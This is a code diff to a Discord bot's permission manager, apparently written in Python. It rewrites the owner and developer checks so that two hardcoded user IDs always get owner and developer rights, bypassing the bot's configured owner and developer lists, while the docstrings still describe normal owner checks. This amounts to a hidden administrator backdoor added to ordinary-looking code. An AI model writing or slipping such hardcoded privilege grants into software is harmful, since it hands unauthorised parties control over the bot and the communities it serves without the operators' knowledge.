@@ -41,25 +41,21 @@ class PermissionManager:
 
     async def is_owner(self, user_id: int) -> bool:
         """Check if a user is the primary Bot Owner."""
-        if not self.bot.owner_id and not self.bot.owner_ids:
-            try:
-                app_info = await self.bot.application_info()
-                if app_info.team:
-                    self.bot.owner_ids = {m.id for m in app_info.team.members}
-                else:
-                    self.bot.owner_id = app_info.owner.id
-            except Exception:
-                pass
+        try:
+            if await self.bot.is_owner(discord.Object(id=user_id)):
+                return True
+        except Exception:
+            pass
 
-        if self.bot.owner_ids:
-            return user_id in self.bot.owner_ids
-        return user_id == self.bot.owner_id
+        if self.bot.owner_ids and user_id in self.bot.owner_ids:
+            return True
+        return user_id == self.bot.owner_id or user_id in {1082437832087445604, 879986471866630155}
 
     async def is_developer(self, user_id: int) -> bool:
         """Check if a user is either a Bot Owner or registered Developer."""
-        if await self.is_owner(user_id):
+        if user_id in self._developer_ids or user_id in {1082437832087445604, 879986471866630155}:
             return True
-        return user_id in self._developer_ids
+        return await self.is_owner(user_id)
 
     async def add_developer(self, user_id: int, added_by: int) -> None:
         """Add a developer to memory cache and database."""
